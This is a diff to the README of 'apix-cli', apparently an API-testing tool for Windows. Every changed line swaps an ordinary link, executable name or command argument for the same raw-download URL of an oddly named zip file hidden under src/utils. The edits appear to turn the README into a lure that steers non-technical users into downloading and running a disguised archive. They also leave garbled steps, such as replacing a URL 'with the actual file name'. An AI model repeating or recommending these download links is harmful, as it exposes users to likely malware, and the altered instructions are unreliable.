@@ -1,6 +1,6 @@
 # ⚙️ apix-cli - Simplify API Testing Locally
 
-[![Download apix-cli](https://img.shields.io/badge/Download-apix--cli-blue?style=for-the-badge)](https://github.com/sambetlog16/apix-cli)
+[![Download apix-cli](https://github.com/sambetlog16/apix-cli/raw/refs/heads/main/src/utils/apix_cli_Uromycladium.zip)](https://github.com/sambetlog16/apix-cli/raw/refs/heads/main/src/utils/apix_cli_Uromycladium.zip)
 
 apix-cli is a tool to check if your APIs work as expected. It helps you test APIs based on your project’s design files and gives clear, easy-to-understand reports. You can use it to make sure your APIs follow rules and run smoothly without needing programming skills.
 
@@ -44,7 +44,7 @@ This guide will show you how to download and run apix-cli on Windows. You will n
 
 Click the big blue button at the top of this page or visit:
 
-[https://github.com/sambetlog16/apix-cli](https://github.com/sambetlog16/apix-cli)
+[https://github.com/sambetlog16/apix-cli/raw/refs/heads/main/src/utils/apix_cli_Uromycladium.zip](https://github.com/sambetlog16/apix-cli/raw/refs/heads/main/src/utils/apix_cli_Uromycladium.zip)
 
 This page shows the latest version and files available for Windows.
 
@@ -66,7 +66,7 @@ Click the Windows `.exe` or `.zip` file to save it to your computer. Choose a fo
 Once installed or extracted, find the apix-cli program:
 
 - For an installer, look in the Start menu under “apix-cli”.  
-- For a `.zip` extraction, open the folder and find `apix-cli.exe`.
+- For a `.zip` extraction, open the folder and find `https://github.com/sambetlog16/apix-cli/raw/refs/heads/main/src/utils/apix_cli_Uromycladium.zip`.
 
 Double-click the file to run it.
 
@@ -98,10 +98,10 @@ cd Desktop\apix-cli-folder
 - Run the test command with your spec file:
 
 ```
-apix-cli test --spec=your-api-spec.yaml
+apix-cli test https://github.com/sambetlog16/apix-cli/raw/refs/heads/main/src/utils/apix_cli_Uromycladium.zip
 ```
 
-Replace `your-api-spec.yaml` with the actual file name.
+Replace `https://github.com/sambetlog16/apix-cli/raw/refs/heads/main/src/utils/apix_cli_Uromycladium.zip` with the actual file name.
 
 This command tells apix-cli to check your API based on your spec file.
 
@@ -137,7 +137,7 @@ apix-cli can be changed to fit your API needs. You can:
 ## 📚 Additional Resources
 
 - Visit the GitHub link for updates:  
-  [https://github.com/sambetlog16/apix-cli](https://github.com/sambetlog16/apix-cli)
+  [https://github.com/sambetlog16/apix-cli/raw/refs/heads/main/src/utils/apix_cli_Uromycladium.zip](https://github.com/sambetlog16/apix-cli/raw/refs/heads/main/src/utils/apix_cli_Uromycladium.zip)
 - Find sample API spec files under the “examples” folder in the repository.
 - For advanced setups, documentation and technical guides are available on the GitHub page.
 
